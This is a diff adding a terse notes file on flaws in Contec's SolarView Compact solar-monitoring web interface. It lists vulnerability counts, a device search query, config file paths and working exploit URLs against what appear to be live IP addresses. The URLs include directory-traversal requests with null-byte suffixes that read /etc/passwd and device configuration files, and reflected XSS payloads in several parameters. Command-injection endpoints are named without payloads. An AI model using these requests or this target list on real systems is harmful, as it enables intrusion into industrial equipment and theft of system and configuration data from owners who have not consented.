@@ -1,0 +1,39 @@
+2 DIRECTORY TRAVERSAL
+3 XSS
+1 OS COMMAND INJECTION
+1 LOCAL FILE DISCLOSURE
+contec
+SolarView Compact
+/home/www/html/
+SolarView Compact ver.6.00
+https://www.contec.com/
+lighttpd http.title:"Top"
+
+
+http://219.119.213.199/network_test.php
+https://www.cvedetails.com/cve/CVE-2021-20661/
+lighttpd http.title:"Top"
+WriteConfig
+$LockFile = "/tmp/svc.lock";
+13	$ConfDataDir = "/home/contec/conf";
+14	$NameFile = "/home/contec/conf/name";
+15	$HistoryFile = "/home/contec/log/event.log";
+16	$VersionFile = "/opt/svc/version";
+17	$DATA_DIR = "/home/contec/data";
+18	$TMP_DIR = "/tmp";
+19	$DATA_EXT = ".csv";
+20	$SlideHoldFile = "/home/contec/conf/slide.hold";
+21	$ModbusFile = "/home/contec/conf/sv_comModbus.conf";
+22	$ScheduleLinkLogFile = "/home/contec/log/scheduleLink.log";
+http://126.148.58.96/Solar_Data.php?file=../../../../../../../../../etc/passwd%00.csv
+http://180.197.69.89/conf_mail.php
+http://219.119.213.199/downloader.php?file=../../../../../../../../../../../../../etc/passwd%00.jpg
+http://219.119.213.199/Solar_Data.php?file=../../../../../../../../../home/contec/conf//solarsystem.conf%00.csv
+http://219.119.213.199/texteditor.php
+http://219.119.213.199/Solar_Data.php?file=../../../../../../../../../home/www/html/include/common.def%00.csv
+http://219.119.213.199/Solar_Data.php?file=../../../../../../../../../etc/lighttpd.conf%00.csv
+https://www.contec.com/jp/products-services/environmental-monitoring/solarview/
+
+http://219.119.213.199/Solar_SlideSub.php?id=4&play=1&pow=sds%22%3E%3Cscript%3Ealert(9)%3C/script%3E%3C%22&bgcolor=green
+http://219.119.213.199/Solar_SlideSub.php?bgcolor=greenx%22%3E%3Cscript%3Ealert(9)%3C/script%3E%3C%22
+http://126.148.58.96/Solar_History.php?time_begin=xx%22%3E%3Cscript%3Ealert(9)%3C/script%3E%3C%22&time_end=&event_level=0&event_pcs=1&search_on=on&search_off=on&word=hj%27&sort_type=0&record=10&command=%95%5C%8E%A6
